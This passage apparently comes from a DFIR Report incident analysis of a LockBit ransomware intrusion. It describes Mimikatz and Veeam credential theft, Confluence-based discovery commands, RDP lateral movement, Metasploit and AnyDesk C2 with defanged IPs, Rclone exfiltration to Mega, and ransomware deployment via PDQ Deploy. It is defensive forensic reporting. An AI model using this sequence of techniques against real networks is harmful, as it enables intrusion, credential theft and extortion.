<p><a href="https://thedfirreport.com/wp-content/uploads/2025/02/27244_021.png"><img loading="lazy" decoding="async" class="aligncenter size-full wp-image-42235" src="https://thedfirreport.com/wp-content/uploads/2025/02/27244_021.png" alt="" width="467" height="187" srcset="https://thedfirreport.com/wp-content/uploads/2025/02/27244_021.png 467w, https://thedfirreport.com/wp-content/uploads/2025/02/27244_021-300x120.png 300w" sizes="auto, (max-width: 467px) 100vw, 467px" /></a></p>



<p>Sysmon event code 1 showed the execution of Mimikatz:</p>





<p><a href="https://thedfirreport.com/wp-content/uploads/2025/02/27244_022.png"><img loading="lazy" decoding="async" class="aligncenter size-full wp-image-42234" src="https://thedfirreport.com/wp-content/uploads/2025/02/27244_022.png" alt="" width="947" height="45" srcset="https://thedfirreport.com/wp-content/uploads/2025/02/27244_022.png 947w, https://thedfirreport.com/wp-content/uploads/2025/02/27244_022-300x14.png 300w, https://thedfirreport.com/wp-content/uploads/2025/02/27244_022-768x36.png 768w" sizes="auto, (max-width: 947px) 100vw, 947px" /></a></p>
<p>Sysmon event code 10 showed that Mimikatz accessed the LSASS process, and we can also see subsequent GrantedAccess for Mimikatz 0x1010 , which translates to: PROCESS_QUERY_LIMITED_INFORMATION (0x1000) and PROCESS_VM_READ (0x0010) .</p>
<p><a href="https://thedfirreport.com/wp-content/uploads/2025/02/27244_023.png"><img loading="lazy" decoding="async" class="aligncenter size-full wp-image-42233" src="https://thedfirreport.com/wp-content/uploads/2025/02/27244_023.png" alt="" width="542" height="47" srcset="https://thedfirreport.com/wp-content/uploads/2025/02/27244_023.png 542w, https://thedfirreport.com/wp-content/uploads/2025/02/27244_023-300x26.png 300w" sizes="auto, (max-width: 542px) 100vw, 542px" /></a></p>





<p>Sysmon event code 11 shows that the Mimikatz process creates a file called passwords.txt:</p>
<p><a href="https://thedfirreport.com/wp-content/uploads/2025/02/27244_024.png"><img loading="lazy" decoding="async" class="aligncenter size-full wp-image-42232" src="https://thedfirreport.com/wp-content/uploads/2025/02/27244_024.png" alt="" width="480" height="47" srcset="https://thedfirreport.com/wp-content/uploads/2025/02/27244_024.png 480w, https://thedfirreport.com/wp-content/uploads/2025/02/27244_024-300x29.png 300w" sizes="auto, (max-width: 480px) 100vw, 480px" /></a></p>





<p>Finally, the threat actor reviewed the captured passwords by opening the newly generated password file in Notepad, as documented in Sysmon event code 1:</p>
<p><a href="https://thedfirreport.com/wp-content/uploads/2025/02/27244_025.png"><img loading="lazy" decoding="async" class="aligncenter size-full wp-image-42231" src="https://thedfirreport.com/wp-content/uploads/2025/02/27244_025.png" alt="" width="890" height="45" srcset="https://thedfirreport.com/wp-content/uploads/2025/02/27244_025.png 890w, https://thedfirreport.com/wp-content/uploads/2025/02/27244_025-300x15.png 300w, https://thedfirreport.com/wp-content/uploads/2025/02/27244_025-768x39.png 768w" sizes="auto, (max-width: 890px) 100vw, 890px" /></a></p>





<p>The threat actor also ran the script Veeam-Get-Creds-New.ps1 on the backup server:</p>
<p><a href="https://thedfirreport.com/wp-content/uploads/2025/02/27244_026.png"><img loading="lazy" decoding="async" class="aligncenter size-full wp-image-42230" src="https://thedfirreport.com/wp-content/uploads/2025/02/27244_026.png" alt="" width="752" height="47" srcset="https://thedfirreport.com/wp-content/uploads/2025/02/27244_026.png 752w, https://thedfirreport.com/wp-content/uploads/2025/02/27244_026-300x19.png 300w" sizes="auto, (max-width: 752px) 100vw, 752px" /></a></p>





<p>Powershell scripts are logged under event code 4104 if <a href="https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.core/about/about_logging_windows?view=powershell-7.4" target="_blank" rel="noreferrer noopener">powershell script block logging is enabled</a>:</p>
<p><a href="https://thedfirreport.com/wp-content/uploads/2025/02/27244_027.png"><img loading="lazy" decoding="async" class="aligncenter size-full wp-image-42229" src="https://thedfirreport.com/wp-content/uploads/2025/02/27244_027.png" alt="" width="925" height="932" srcset="https://thedfirreport.com/wp-content/uploads/2025/02/27244_027.png 925w, https://thedfirreport.com/wp-content/uploads/2025/02/27244_027-298x300.png 298w, https://thedfirreport.com/wp-content/uploads/2025/02/27244_027-150x150.png 150w, https://thedfirreport.com/wp-content/uploads/2025/02/27244_027-768x774.png 768w" sizes="auto, (max-width: 925px) 100vw, 925px" /></a></p>





<p>The script looks to be from the <a href="https://github.com/sadshade/veeam-creds" target="_blank" rel="noreferrer noopener">sadshade/veam-creds</a> GitHub repository, and the script tries to get credentials from the Veeam credential manager.</p>



<p>The threat actor also discovered a txt file on a file share server that contained IT-related cleartext passwords. Included were the credentials for a Domain Admin account. Through their RDP session, they proceeded with opening the the txt file using Notepad. Illustrated below via the process execution evidence:</p>
<p><a href="https://thedfirreport.com/wp-content/uploads/2025/02/27244_028.png"><img loading="lazy" decoding="async" class="aligncenter size-full wp-image-42228" src="https://thedfirreport.com/wp-content/uploads/2025/02/27244_028.png" alt="" width="926" height="55" srcset="https://thedfirreport.com/wp-content/uploads/2025/02/27244_028.png 926w, https://thedfirreport.com/wp-content/uploads/2025/02/27244_028-300x18.png 300w, https://thedfirreport.com/wp-content/uploads/2025/02/27244_028-768x46.png 768w" sizes="auto, (max-width: 926px) 100vw, 926px" /></a></p>





<h2 id="discovery" class="wp-block-heading"><a href="#discovery">Discovery</a></h2>



<p>The following commands were executed via the Confluence RCE:</p>



<pre class="wp-block-preformatted">net user
whoami
query user
</pre>



<figure class="wp-block-image"></figure>
<p><a href="https://thedfirreport.com/wp-content/uploads/2025/02/27244_029.png"><img loading="lazy" decoding="async" class="aligncenter size-full wp-image-42227" src="https://thedfirreport.com/wp-content/uploads/2025/02/27244_029.png" alt="" width="989" height="169" srcset="https://thedfirreport.com/wp-content/uploads/2025/02/27244_029.png 989w, https://thedfirreport.com/wp-content/uploads/2025/02/27244_029-300x51.png 300w, https://thedfirreport.com/wp-content/uploads/2025/02/27244_029-768x131.png 768w" sizes="auto, (max-width: 989px) 100vw, 989px" /></a></p>



<p>From the Meterpreter session, tasklist was used to enumerate the running processes. This threat actor identified C2 processes that were established by a different actor and used &#8216;taskkill&#8217; to end them.</p>
<p><a href="https://thedfirreport.com/wp-content/uploads/2025/02/27244_030.png"><img loading="lazy" decoding="async" class="aligncenter size-full wp-image-42226" src="https://thedfirreport.com/wp-content/uploads/2025/02/27244_030.png" alt="" width="707" height="363" srcset="https://thedfirreport.com/wp-content/uploads/2025/02/27244_030.png 707w, https://thedfirreport.com/wp-content/uploads/2025/02/27244_030-300x154.png 300w" sizes="auto, (max-width: 707px) 100vw, 707px" /></a></p>





<p>During this task, we noticed a threat actor blunder: the &#8216;taskkill&#8217; execution on &#8216;powershell.exe&#8217; killed their own Meterpreter session. Consequently, they re-exploited Confluence to establish yet another Meterpreter session. Then, further discovery commands were executed on the host:</p>



<pre class="wp-block-preformatted">query user
net user
hostname
ipconfig
</pre>



<figure class="wp-block-image"></figure>
<p><a href="https://thedfirreport.com/wp-content/uploads/2025/02/27244_031.png"><img loading="lazy" decoding="async" class="aligncenter size-full wp-image-42225" src="https://thedfirreport.com/wp-content/uploads/2025/02/27244_031.png" alt="" width="643" height="198" srcset="https://thedfirreport.com/wp-content/uploads/2025/02/27244_031.png 643w, https://thedfirreport.com/wp-content/uploads/2025/02/27244_031-300x92.png 300w" sizes="auto, (max-width: 643px) 100vw, 643px" /></a></p>



<p>NetScan was then utilized to enumerate the local network:</p>
<p><a href="https://thedfirreport.com/wp-content/uploads/2025/02/27244_032.png"><img loading="lazy" decoding="async" class="aligncenter size-full wp-image-42224" src="https://thedfirreport.com/wp-content/uploads/2025/02/27244_032.png" alt="" width="852" height="514" srcset="https://thedfirreport.com/wp-content/uploads/2025/02/27244_032.png 852w, https://thedfirreport.com/wp-content/uploads/2025/02/27244_032-300x181.png 300w, https://thedfirreport.com/wp-content/uploads/2025/02/27244_032-768x463.png 768w" sizes="auto, (max-width: 852px) 100vw, 852px" /></a></p>





<p>When NetScan is executed with the &#8216;Check for write access&#8217; option enabled, a &#8216;delete.me&#8217; file is created then deleted on discovered shares. We can observe this in Event ID 5145:</p>
<p><a href="https://thedfirreport.com/wp-content/uploads/2025/02/27244_033.png"><img loading="lazy" decoding="async" class="aligncenter size-full wp-image-42223" src="https://thedfirreport.com/wp-content/uploads/2025/02/27244_033.png" alt="" width="610" height="267" srcset="https://thedfirreport.com/wp-content/uploads/2025/02/27244_033.png 610w, https://thedfirreport.com/wp-content/uploads/2025/02/27244_033-300x131.png 300w" sizes="auto, (max-width: 610px) 100vw, 610px" /></a></p>





<p>After moving to a Domain Controller, &#8216;query user&#8217; was once again executed. Then the Domain Admins group was enumerated, after a typo:</p>
<p><a href="https://thedfirreport.com/wp-content/uploads/2025/02/27244_034.png"><img loading="lazy" decoding="async" class="aligncenter size-full wp-image-42222" src="https://thedfirreport.com/wp-content/uploads/2025/02/27244_034.png" alt="" width="745" height="110" srcset="https://thedfirreport.com/wp-content/uploads/2025/02/27244_034.png 745w, https://thedfirreport.com/wp-content/uploads/2025/02/27244_034-300x44.png 300w" sizes="auto, (max-width: 745px) 100vw, 745px" /></a></p>







<h2 id="lateral-movement" class="wp-block-heading"><a href="#lateral-movement">Lateral Movement</a></h2>



<p>Throughout the intrusion, RDP was used for lateral movement. The &#8216;Remote Desktop Connection&#8217; app (mstsc.exe) was used on the Confluence beachhead to interactively logon to targeted hosts in the environment. The Event ID 4624 logon activity:</p>
<p><a href="https://thedfirreport.com/wp-content/uploads/2025/02/27244_035.png"><img loading="lazy" decoding="async" class="aligncenter size-full wp-image-42221" src="https://thedfirreport.com/wp-content/uploads/2025/02/27244_035.png" alt="" width="1089" height="249" srcset="https://thedfirreport.com/wp-content/uploads/2025/02/27244_035.png 1089w, https://thedfirreport.com/wp-content/uploads/2025/02/27244_035-300x69.png 300w, https://thedfirreport.com/wp-content/uploads/2025/02/27244_035-1024x234.png 1024w, https://thedfirreport.com/wp-content/uploads/2025/02/27244_035-768x176.png 768w" sizes="auto, (max-width: 1089px) 100vw, 1089px" /></a></p>





<p>Lateral movement with RDP was done to different hosts in swift succession. Starting under one hour after the initial compromise of the beachhead host. All RDP was performed from the beachhead.</p>
<p><a href="https://thedfirreport.com/wp-content/uploads/2025/02/27244_036.png"><img loading="lazy" decoding="async" class="aligncenter size-full wp-image-42220" src="https://thedfirreport.com/wp-content/uploads/2025/02/27244_036.png" alt="" width="1275" height="740" srcset="https://thedfirreport.com/wp-content/uploads/2025/02/27244_036.png 1275w, https://thedfirreport.com/wp-content/uploads/2025/02/27244_036-300x174.png 300w, https://thedfirreport.com/wp-content/uploads/2025/02/27244_036-1024x594.png 1024w, https://thedfirreport.com/wp-content/uploads/2025/02/27244_036-768x446.png 768w" sizes="auto, (max-width: 1275px) 100vw, 1275px" /></a></p>



<p>&nbsp;</p>

<h2 id="collection" class="wp-block-heading"><a href="#collection">Collection</a></h2>



<p>The threat actor used Rclone to exfiltrate everything in a file share, see &#8216;<a href="#exfiltration">Exfiltration</a>&#8216; for more details. However, there were a few groups of files that were copied to C:\temp on the beachhead and then deleted about 30 seconds later.</p>
<p><a href="https://thedfirreport.com/wp-content/uploads/2025/02/27244_037.png"><img loading="lazy" decoding="async" class="aligncenter size-full wp-image-42219" src="https://thedfirreport.com/wp-content/uploads/2025/02/27244_037.png" alt="" width="947" height="440" srcset="https://thedfirreport.com/wp-content/uploads/2025/02/27244_037.png 947w, https://thedfirreport.com/wp-content/uploads/2025/02/27244_037-300x139.png 300w, https://thedfirreport.com/wp-content/uploads/2025/02/27244_037-768x357.png 768w" sizes="auto, (max-width: 947px) 100vw, 947px" /></a></p>





<h2 id="command-and-control" class="wp-block-heading"><a href="#command-and-control">Command and Control</a></h2>



<h4 class="wp-block-heading">Metasploit</h4>



<p>Command and control (C2) connections were established via Metasploit from the breached Confluence server to the IP address 92.51.2[.]22 which is hosted in the provider called Flyservers S.A., reported in other <a href="https://osintteam.blog/infrastructure-analysis-lockbit-3-0-799a4ff1ca59" target="_blank" rel="noreferrer noopener">blogs</a> for being used by LockBit affiliates.</p>
<p><a href="https://thedfirreport.com/wp-content/uploads/2025/02/27244_038.png"><img loading="lazy" decoding="async" class="aligncenter size-full wp-image-42218" src="https://thedfirreport.com/wp-content/uploads/2025/02/27244_038.png" alt="" width="2000" height="969" srcset="https://thedfirreport.com/wp-content/uploads/2025/02/27244_038.png 2000w, https://thedfirreport.com/wp-content/uploads/2025/02/27244_038-300x145.png 300w, https://thedfirreport.com/wp-content/uploads/2025/02/27244_038-1024x496.png 1024w, https://thedfirreport.com/wp-content/uploads/2025/02/27244_038-768x372.png 768w, https://thedfirreport.com/wp-content/uploads/2025/02/27244_038-1536x744.png 1536w" sizes="auto, (max-width: 2000px) 100vw, 2000px" /></a></p>





<p>The connections were made to the port 4321.</p>
<p><a href="https://thedfirreport.com/wp-content/uploads/2025/02/27244_039.png"><img loading="lazy" decoding="async" class="aligncenter size-full wp-image-42217" src="https://thedfirreport.com/wp-content/uploads/2025/02/27244_039.png" alt="" width="922" height="647" srcset="https://thedfirreport.com/wp-content/uploads/2025/02/27244_039.png 922w, https://thedfirreport.com/wp-content/uploads/2025/02/27244_039-300x211.png 300w, https://thedfirreport.com/wp-content/uploads/2025/02/27244_039-768x539.png 768w" sizes="auto, (max-width: 922px) 100vw, 922px" /></a></p>





<p>When downloading the Meterpreter HTA stager, the threat actor downloaded it by using a user-agent associated with Internet Explorer.</p>
<p><a href="https://thedfirreport.com/wp-content/uploads/2025/02/27244_074.png"><img loading="lazy" decoding="async" class="aligncenter size-full wp-image-42256" src="https://thedfirreport.com/wp-content/uploads/2025/02/27244_074.png" alt="" width="1526" height="281" srcset="https://thedfirreport.com/wp-content/uploads/2025/02/27244_074.png 1526w, https://thedfirreport.com/wp-content/uploads/2025/02/27244_074-300x55.png 300w, https://thedfirreport.com/wp-content/uploads/2025/02/27244_074-1024x189.png 1024w, https://thedfirreport.com/wp-content/uploads/2025/02/27244_074-768x141.png 768w" sizes="auto, (max-width: 1526px) 100vw, 1526px" /></a></p>
<p>&nbsp;</p>





<h4 class="wp-block-heading">AnyDesk</h4>



<p>A second C2 server 92.51.2[.]27 was employed to connect to AnyDesk.</p>
<p><a href="https://thedfirreport.com/wp-content/uploads/2025/02/27244_040.png"><img loading="lazy" decoding="async" class="aligncenter size-full wp-image-42216" src="https://thedfirreport.com/wp-content/uploads/2025/02/27244_040.png" alt="" width="1628" height="877" srcset="https://thedfirreport.com/wp-content/uploads/2025/02/27244_040.png 1628w, https://thedfirreport.com/wp-content/uploads/2025/02/27244_040-300x162.png 300w, https://thedfirreport.com/wp-content/uploads/2025/02/27244_040-1024x552.png 1024w, https://thedfirreport.com/wp-content/uploads/2025/02/27244_040-768x414.png 768w, https://thedfirreport.com/wp-content/uploads/2025/02/27244_040-1536x827.png 1536w" sizes="auto, (max-width: 1628px) 100vw, 1628px" /></a></p>





<p>Through Fofa, it was possible to identify the hostname, WIN-EKIHV2OQQP8, associated with the server in the period related to the incident.</p>
<p><a href="https://thedfirreport.com/wp-content/uploads/2025/02/27244_041.png"><img loading="lazy" decoding="async" class="aligncenter size-full wp-image-42215" src="https://thedfirreport.com/wp-content/uploads/2025/02/27244_041.png" alt="" width="1884" height="483" srcset="https://thedfirreport.com/wp-content/uploads/2025/02/27244_041.png 1884w, https://thedfirreport.com/wp-content/uploads/2025/02/27244_041-300x77.png 300w, https://thedfirreport.com/wp-content/uploads/2025/02/27244_041-1024x263.png 1024w, https://thedfirreport.com/wp-content/uploads/2025/02/27244_041-768x197.png 768w, https://thedfirreport.com/wp-content/uploads/2025/02/27244_041-1536x394.png 1536w" sizes="auto, (max-width: 1884px) 100vw, 1884px" /></a></p>





<p>This hostname was observed in the login activity on the beachhead host for this intrusion.</p>
<p><a href="https://thedfirreport.com/wp-content/uploads/2025/02/27244_042.png"><img loading="lazy" decoding="async" class="aligncenter size-full wp-image-42214" src="https://thedfirreport.com/wp-content/uploads/2025/02/27244_042.png" alt="" width="722" height="358" srcset="https://thedfirreport.com/wp-content/uploads/2025/02/27244_042.png 722w, https://thedfirreport.com/wp-content/uploads/2025/02/27244_042-300x149.png 300w" sizes="auto, (max-width: 722px) 100vw, 722px" /></a></p>





<p>The hostname can be traced through the certificate on the RDP service (port 3389), valid since the end of October 2023.</p>
<p><a href="https://thedfirreport.com/wp-content/uploads/2025/02/27244_043.png"><img loading="lazy" decoding="async" class="aligncenter size-full wp-image-42213" src="https://thedfirreport.com/wp-content/uploads/2025/02/27244_043.png" alt="" width="1178" height="573" srcset="https://thedfirreport.com/wp-content/uploads/2025/02/27244_043.png 1178w, https://thedfirreport.com/wp-content/uploads/2025/02/27244_043-300x146.png 300w, https://thedfirreport.com/wp-content/uploads/2025/02/27244_043-1024x498.png 1024w, https://thedfirreport.com/wp-content/uploads/2025/02/27244_043-768x374.png 768w" sizes="auto, (max-width: 1178px) 100vw, 1178px" /></a></p>





<p>By searching for this hostname in <a href="https://en.fofa.info/result?qbase64=IldJTi1FS0lIVjJPUVFQOCI%3D" target="_blank" rel="noreferrer noopener">fofa.info</a>, it was possible to identify multiple IP addresses that were associated with malicious activities in VirusTotal in the past, some examples in the following image.</p>
<p><a href="https://thedfirreport.com/wp-content/uploads/2025/02/27244_044.png"><img loading="lazy" decoding="async" class="aligncenter size-full wp-image-42212" src="https://thedfirreport.com/wp-content/uploads/2025/02/27244_044.png" alt="" width="1302" height="1125" srcset="https://thedfirreport.com/wp-content/uploads/2025/02/27244_044.png 1302w, https://thedfirreport.com/wp-content/uploads/2025/02/27244_044-300x259.png 300w, https://thedfirreport.com/wp-content/uploads/2025/02/27244_044-1024x885.png 1024w, https://thedfirreport.com/wp-content/uploads/2025/02/27244_044-768x664.png 768w" sizes="auto, (max-width: 1302px) 100vw, 1302px" /></a></p>





<p>The same hunt on Censys allowed us to identify six IP addresses which were potentially associated with the ShadowSyndicate ransomware group based on a tweet made by <a href="https://x.com/JRehbergCSK" target="_blank" rel="noreferrer noopener">@JRehbergCSK</a>.</p>
<p><a href="https://thedfirreport.com/wp-content/uploads/2025/02/27244_045.png"><img loading="lazy" decoding="async" class="aligncenter size-full wp-image-42211" src="https://thedfirreport.com/wp-content/uploads/2025/02/27244_045.png" alt="" width="1188" height="1125" srcset="https://thedfirreport.com/wp-content/uploads/2025/02/27244_045.png 1188w, https://thedfirreport.com/wp-content/uploads/2025/02/27244_045-300x284.png 300w, https://thedfirreport.com/wp-content/uploads/2025/02/27244_045-1024x970.png 1024w, https://thedfirreport.com/wp-content/uploads/2025/02/27244_045-768x727.png 768w" sizes="auto, (max-width: 1188px) 100vw, 1188px" /></a></p>





<figure class="wp-block-image"></figure>
<p><a href="https://thedfirreport.com/wp-content/uploads/2025/02/27244_046.png"><img loading="lazy" decoding="async" class="aligncenter size-full wp-image-42210" src="https://thedfirreport.com/wp-content/uploads/2025/02/27244_046.png" alt="" width="763" height="392" srcset="https://thedfirreport.com/wp-content/uploads/2025/02/27244_046.png 763w, https://thedfirreport.com/wp-content/uploads/2025/02/27244_046-300x154.png 300w" sizes="auto, (max-width: 763px) 100vw, 763px" /></a></p>



<p>Some of the identified IP addresses like 194.165.16[.]60 and 45.227.252[.]227 were also mentioned in a <a href="https://www.group-ib.com/blog/shadowsyndicate-raas/" target="_blank" rel="noreferrer noopener">Group-IB Report</a> about ShadowSyndicate.</p>



<p>The AnyDesk connection was utilized to drop tools to enumerate the infrastructure, access credentials and exfiltrate and encrypt data.</p>
<p><a href="https://thedfirreport.com/wp-content/uploads/2025/02/27244_047.png"><img loading="lazy" decoding="async" class="aligncenter size-full wp-image-42209" src="https://thedfirreport.com/wp-content/uploads/2025/02/27244_047.png" alt="" width="1205" height="1739" srcset="https://thedfirreport.com/wp-content/uploads/2025/02/27244_047.png 1205w, https://thedfirreport.com/wp-content/uploads/2025/02/27244_047-208x300.png 208w, https://thedfirreport.com/wp-content/uploads/2025/02/27244_047-710x1024.png 710w, https://thedfirreport.com/wp-content/uploads/2025/02/27244_047-768x1108.png 768w, https://thedfirreport.com/wp-content/uploads/2025/02/27244_047-1064x1536.png 1064w" sizes="auto, (max-width: 1205px) 100vw, 1205px" /></a></p>





<h2 class="wp-block-heading" id="exfiltration"><a href="#exfiltration">Exfiltration</a></h2>



<p>Just one hour and eleven minutes after initial access the threat actor started exfiltration activity. This was done from a file share server, performed with Rclone and exfiltrated to mega (<a href="https://Mega.nz" target="_blank" rel="noreferrer noopener">Mega.nz</a>). <a href="https://thedfirreport.com/?s=rclone" target="_blank" rel="noreferrer noopener">We have previously reported on the usage of rclone several times.</a></p>
<p><a href="https://thedfirreport.com/wp-content/uploads/2025/02/27244_048.png"><img loading="lazy" decoding="async" class="aligncenter size-full wp-image-42208" src="https://thedfirreport.com/wp-content/uploads/2025/02/27244_048.png" alt="" width="557" height="47" srcset="https://thedfirreport.com/wp-content/uploads/2025/02/27244_048.png 557w, https://thedfirreport.com/wp-content/uploads/2025/02/27244_048-300x25.png 300w" sizes="auto, (max-width: 557px) 100vw, 557px" /></a></p>





<p>We were able to retrieve the Rclone configuration file used:</p>
<p><a href="https://thedfirreport.com/wp-content/uploads/2025/02/27244_049.png"><img loading="lazy" decoding="async" class="aligncenter size-full wp-image-42207" src="https://thedfirreport.com/wp-content/uploads/2025/02/27244_049.png" alt="" width="2015" height="87" srcset="https://thedfirreport.com/wp-content/uploads/2025/02/27244_049.png 2015w, https://thedfirreport.com/wp-content/uploads/2025/02/27244_049-300x13.png 300w, https://thedfirreport.com/wp-content/uploads/2025/02/27244_049-1024x44.png 1024w, https://thedfirreport.com/wp-content/uploads/2025/02/27244_049-768x33.png 768w, https://thedfirreport.com/wp-content/uploads/2025/02/27244_049-1536x66.png 1536w" sizes="auto, (max-width: 2015px) 100vw, 2015px" /></a></p>





<p>As shown above the configuration file is encrypted and password protected. Fortunately the threat actor had bad opsec and reused a password so we were able to decrypt the file using the &#8220;<a href="https://rclone.org/commands/rclone_config_show/" target="_blank" rel="noreferrer noopener">rclone config show</a>&#8221; command:</p>
<p><a href="https://thedfirreport.com/wp-content/uploads/2025/02/27244_050.png"><img loading="lazy" decoding="async" class="aligncenter size-full wp-image-42206" src="https://thedfirreport.com/wp-content/uploads/2025/02/27244_050.png" alt="" width="1757" height="400" srcset="https://thedfirreport.com/wp-content/uploads/2025/02/27244_050.png 1757w, https://thedfirreport.com/wp-content/uploads/2025/02/27244_050-300x68.png 300w, https://thedfirreport.com/wp-content/uploads/2025/02/27244_050-1024x233.png 1024w, https://thedfirreport.com/wp-content/uploads/2025/02/27244_050-768x175.png 768w, https://thedfirreport.com/wp-content/uploads/2025/02/27244_050-1536x350.png 1536w" sizes="auto, (max-width: 1757px) 100vw, 1757px" /></a></p>





<p>From Zeek network logs we see data being exfiltrated:</p>
<p><a href="https://thedfirreport.com/wp-content/uploads/2025/02/27244_051.png"><img loading="lazy" decoding="async" class="aligncenter size-full wp-image-42205" src="https://thedfirreport.com/wp-content/uploads/2025/02/27244_051.png" alt="" width="585" height="232" srcset="https://thedfirreport.com/wp-content/uploads/2025/02/27244_051.png 585w, https://thedfirreport.com/wp-content/uploads/2025/02/27244_051-300x119.png 300w" sizes="auto, (max-width: 585px) 100vw, 585px" /></a></p>





<p>Suricata was also alerting on the activity:</p>
<p><a href="https://thedfirreport.com/wp-content/uploads/2025/02/27244_052.png"><img loading="lazy" decoding="async" class="aligncenter size-full wp-image-42204" src="https://thedfirreport.com/wp-content/uploads/2025/02/27244_052.png" alt="" width="362" height="352" srcset="https://thedfirreport.com/wp-content/uploads/2025/02/27244_052.png 362w, https://thedfirreport.com/wp-content/uploads/2025/02/27244_052-300x292.png 300w" sizes="auto, (max-width: 362px) 100vw, 362px" /></a></p>





<p>From the network traffic we see HTTP posts done with rclone:</p>
<p><a href="https://thedfirreport.com/wp-content/uploads/2025/02/27244_053.png"><img loading="lazy" decoding="async" class="aligncenter size-full wp-image-42203" src="https://thedfirreport.com/wp-content/uploads/2025/02/27244_053.png" alt="" width="715" height="100" srcset="https://thedfirreport.com/wp-content/uploads/2025/02/27244_053.png 715w, https://thedfirreport.com/wp-content/uploads/2025/02/27244_053-300x42.png 300w" sizes="auto, (max-width: 715px) 100vw, 715px" /></a></p>



<h2 class="wp-block-heading"> </h2>



<h2 id="impact" class="wp-block-heading"><a href="#impact">Impact</a></h2>



<p>After around two hours into the intrusion, the threat actor transferred PDQ Deploy and the LockBit Black executable, under the C:\Temp folder on the beachhead host. The same files were then also created on the domain controller. <a href="https://www.pdq.com/pdq-deploy/" target="_blank" rel="noreferrer noopener">PDQ Deploy</a> is a software tool designed for automating patch management and deploying applications. In this case, it was leveraged to facilitate the deployment of the LockBit ransomware.</p>
<p><a href="https://thedfirreport.com/wp-content/uploads/2025/02/27244_054.png"><img loading="lazy" decoding="async" class="aligncenter size-full wp-image-42202" src="https://thedfirreport.com/wp-content/uploads/2025/02/27244_054.png" alt="" width="1623" height="195" srcset="https://thedfirreport.com/wp-content/uploads/2025/02/27244_054.png 1623w, https://thedfirreport.com/wp-content/uploads/2025/02/27244_054-300x36.png 300w, https://thedfirreport.com/wp-content/uploads/2025/02/27244_054-1024x123.png 1024w, https://thedfirreport.com/wp-content/uploads/2025/02/27244_054-768x92.png 768w, https://thedfirreport.com/wp-content/uploads/2025/02/27244_054-1536x185.png 1536w" sizes="auto, (max-width: 1623px) 100vw, 1623px" /></a></p>





<p>Before the threat actor used PDQ they first ran the LockBit binary manually over RDP sessions on the back server and file server.</p>
<p><a href="https://thedfirreport.com/wp-content/uploads/2025/02/27244_055.png"><img loading="lazy" decoding="async" class="aligncenter size-full wp-image-42201" src="https://thedfirreport.com/wp-content/uploads/2025/02/27244_055.png" alt="" width="998" height="197" srcset="https://thedfirreport.com/wp-content/uploads/2025/02/27244_055.png 998w, https://thedfirreport.com/wp-content/uploads/2025/02/27244_055-300x59.png 300w, https://thedfirreport.com/wp-content/uploads/2025/02/27244_055-768x152.png 768w" sizes="auto, (max-width: 998px) 100vw, 998px" /></a></p>





<p>The next deployment process began with PDQ Deploy being executed from the beachhead system. Organizations can utilize the PDQ Deploy to remotely and efficiently create multi-step deployments for end users, supporting various formats such as .exe, .msi, .bat, .ps1, and .vbs. PDQ Deploy allows administrators to execute scripts and commands (e.g., PowerShell, VBScript, and batch files) on remote computers and groups integrated with Spiceworks, Active Directory, or PDQ Inventory. The tool also provides deployment reports to monitor and track successful deployments.</p>



<p>PDQ Deploy operates through two Windows services:</p>



<ul class="wp-block-list">
<li><strong>PDQDeployService.exe</strong> is the background service that manages all schedules and deployments on the console.</li>



<li><strong>PDQDeployRunner-n</strong> (e.g., PDQDeployRunner-1) is the target service executed on remote hosts to perform the deployments.</li>
</ul>



<p>During deployment, the target service and installation files for the deployment package are copied to a directory on the target computer’s default share, enabling the execution of deployment tasks.</p>
<p><a href="https://thedfirreport.com/wp-content/uploads/2025/02/27244_056.png"><img loading="lazy" decoding="async" class="aligncenter size-full wp-image-42200" src="https://thedfirreport.com/wp-content/uploads/2025/02/27244_056.png" alt="" width="1512" height="416" srcset="https://thedfirreport.com/wp-content/uploads/2025/02/27244_056.png 1512w, https://thedfirreport.com/wp-content/uploads/2025/02/27244_056-300x83.png 300w, https://thedfirreport.com/wp-content/uploads/2025/02/27244_056-1024x282.png 1024w, https://thedfirreport.com/wp-content/uploads/2025/02/27244_056-768x211.png 768w" sizes="auto, (max-width: 1512px) 100vw, 1512px" /></a></p>





<p>To facilitate the ransomware deployment with PDQ the threat actor created a file called asd.bat to launch the LockBit executable.</p>
<p><a href="https://thedfirreport.com/wp-content/uploads/2025/02/27244_057.png"><img loading="lazy" decoding="async" class="aligncenter size-full wp-image-42199" src="https://thedfirreport.com/wp-content/uploads/2025/02/27244_057.png" alt="" width="437" height="188" srcset="https://thedfirreport.com/wp-content/uploads/2025/02/27244_057.png 437w, https://thedfirreport.com/wp-content/uploads/2025/02/27244_057-300x129.png 300w" sizes="auto, (max-width: 437px) 100vw, 437px" /></a></p>





<p>asd.bat content:</p>
<p><a href="https://thedfirreport.com/wp-content/uploads/2025/02/27244_058.png"><img loading="lazy" decoding="async" class="aligncenter size-full wp-image-42198" src="https://thedfirreport.com/wp-content/uploads/2025/02/27244_058.png" alt="" width="277" height="52" /></a></p>





<p>We were able collect the PDQ .db files from C:\ProgramData\Admin Arsenal\PDQ Deploy\ on the beachhead to see the deployment data created by the threat actor.</p>



<p>Threat actor logged in via their &#8216;backup&#8217; user:</p>
<p><a href="https://thedfirreport.com/wp-content/uploads/2025/02/27244_059.png"><img loading="lazy" decoding="async" class="aligncenter size-full wp-image-42197" src="https://thedfirreport.com/wp-content/uploads/2025/02/27244_059.png" alt="" width="897" height="171" srcset="https://thedfirreport.com/wp-content/uploads/2025/02/27244_059.png 897w, https://thedfirreport.com/wp-content/uploads/2025/02/27244_059-300x57.png 300w, https://thedfirreport.com/wp-content/uploads/2025/02/27244_059-768x146.png 768w" sizes="auto, (max-width: 897px) 100vw, 897px" /></a></p>





<p>Domain Admin User/Credentials used to deploy:</p>
<p><a href="https://thedfirreport.com/wp-content/uploads/2025/02/27244_060.png"><img loading="lazy" decoding="async" class="aligncenter size-full wp-image-42196" src="https://thedfirreport.com/wp-content/uploads/2025/02/27244_060.png" alt="" width="901" height="171" srcset="https://thedfirreport.com/wp-content/uploads/2025/02/27244_060.png 901w, https://thedfirreport.com/wp-content/uploads/2025/02/27244_060-300x57.png 300w, https://thedfirreport.com/wp-content/uploads/2025/02/27244_060-768x146.png 768w" sizes="auto, (max-width: 901px) 100vw, 901px" /></a></p>





<p>Files included in PDQ library:</p>
